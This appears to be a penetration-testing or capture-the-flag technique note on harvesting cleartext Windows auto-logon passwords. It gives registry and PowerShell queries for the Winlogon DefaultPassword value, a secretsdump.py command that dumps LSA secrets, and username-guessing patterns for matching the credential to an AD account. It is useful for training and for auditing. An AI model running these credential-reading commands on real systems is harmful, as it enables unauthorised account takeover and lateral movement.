# Winlogon AutoAdminLogon — DefaultPassword Extraction

## When this applies

- Windows foothold (any user shell — even non-admin via WinRM).
- Goal: read cleartext credentials from the Winlogon `DefaultPassword` registry value or LSA secrets.

## Technique

This is a 1-second post-foothold check that solves whole boxes. The Winlogon key stores cleartext credentials for any account configured for unattended auto-logon — frequently a service account with elevated rights.

## Steps

```bash
# (a) FROM A NON-ADMIN SHELL — direct registry read, no secretsdump required.
#     Works over WinRM as any local user (even svc accounts):
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  /v AutoAdminLogon /v DefaultUserName /v DefaultDomainName /v DefaultPassword
# Or PowerShell:
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
  Select AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword

# (b) FROM ADMIN — secretsdump.py LSA secrets includes "[*] DefaultPassword"
#     even when the registry value is hidden (some installers move it into LSA).
secretsdump.py -k -no-pass 'domain/Administrator@TARGET.domain.com'
# Output includes: [*] DefaultPassword \n DOMAIN\user:ClearTextPassword
# Common in: ADFS servers, kiosk machines, service workstations with auto-logon
```

## DefaultUserName ≠ sAMAccountName

DefaultUserName ≠ sAMAccountName. Installers / admins frequently write the *display name* into Winlogon while the *sAMAccountName* gets truncated. sAMAccountName is capped at 20 chars, so a DefaultUserName of `svc_loanmanager` (15 chars but maybe not the real account) often has a real account named `svc_loanmgr`, `svcloanmgr`, etc.

Always cross-check candidate names against actual AD enumeration before assuming the credential is unusable. Common truncation patterns to try:

- drop vowels (svc_loanmgr, svc_lnmgr)
- shorten to 20 chars max (anything longer cannot be a sAMAccountName)
- `<first-initial><lastname>`, `<lastname><firstname>`, lastname only
- look in LDAP for nearest match: `ldapsearch ... '(sAMAccountName=svc_*)'`

## Verifying success

- The registry query returns a non-empty `DefaultPassword`.
- Authenticating with `DefaultUserName:DefaultPassword` against SMB/WinRM/LDAP succeeds.

## Common pitfalls

- DefaultUserName may be a display name truncated/transformed from the actual sAMAccountName — always cross-check against LDAP.
- Some installers move the password from registry into LSA secrets — needs admin + secretsdump to reach.

## Tools

- reg.exe / Get-ItemProperty
- impacket `secretsdump.py`
- ldapsearch (sAMAccountName lookup)
